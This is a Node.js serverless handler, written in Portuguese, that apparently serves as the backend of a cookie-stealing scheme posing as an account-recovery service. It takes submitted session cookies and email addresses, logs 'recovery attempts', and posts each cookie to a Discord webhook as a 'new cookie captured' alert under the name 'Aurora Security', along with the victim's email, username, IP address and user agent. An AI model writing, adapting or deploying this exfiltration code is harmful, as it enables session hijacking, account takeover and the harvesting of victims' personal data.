const connectDB = require('../../lib/db');
const User = require('../../models/User');

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

module.exports = async (req, res) => {
  // Permitir apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Método não permitido' });
  }

  try {
    await connectDB();

    const { cookie, email, userId, username } = req.body;

    if (!cookie || !email) {
      return res.status(400).json({ 
        message: 'Cookie e email são obrigatórios' 
      });
    }

    // Atualizar tentativas do usuário
    if (userId) {
      await User.findByIdAndUpdate(userId, {
        $inc: { recoveryAttempts: 1 },
        $set: { lastRecoveryAttempt: new Date() },
      });
    }

    // Enviar para o Discord
    const payload = {
      content: `✨ **NOVO COOKIE CAPTURADO - AURORA** ✨\n\n` +
        `🍪 **Cookie:** \`${cookie}\`\n` +
        `📧 **Email:** ${email}\n` +
        `👤 **Usuário:** ${username || 'Não informado'}\n` +
        `📱 **User Agent:** \`${req.headers['user-agent'] || 'Desconhecido'}\`\n` +
        `🌐 **IP:** \`${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconhecido'}\`\n` +
        `⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n` +
        `✨ **#Aurora** ✨`,
      username: 'Aurora Security',
    };

    if (WEBHOOK_URL) {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    }

    return res.status(200).json({ 
      message: 'Dados enviados com sucesso' 
    });

  } catch (error) {
    console.error('Erro no webhook:', error);
    return res.status(500).json({ 
      message: 'Erro ao processar dados' 
    });
  }
};